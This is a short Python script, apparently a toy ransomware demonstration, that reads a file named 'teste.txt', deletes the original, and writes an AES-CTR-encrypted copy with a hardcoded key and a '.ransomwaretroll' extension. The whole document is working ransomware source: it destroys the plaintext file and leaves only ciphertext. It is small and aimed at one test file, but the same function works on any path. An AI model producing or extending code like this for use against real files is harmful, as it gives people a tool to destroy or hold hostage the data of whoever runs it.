import os
import pyaes

def encrypt_file(file_name, key):
    with open(file_name, "rb") as file:
        file_data = file.read()

    os.remove(file_name)

    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    new_file_name = file_name + ".ransomwaretroll"
    with open(new_file_name, "wb") as new_file:
        new_file.write(crypto_data)

if __name__ == "__main__":
    key = b"testeransomwares"
    original_file_name = "teste.txt"
    encrypt_file(original_file_name, key)
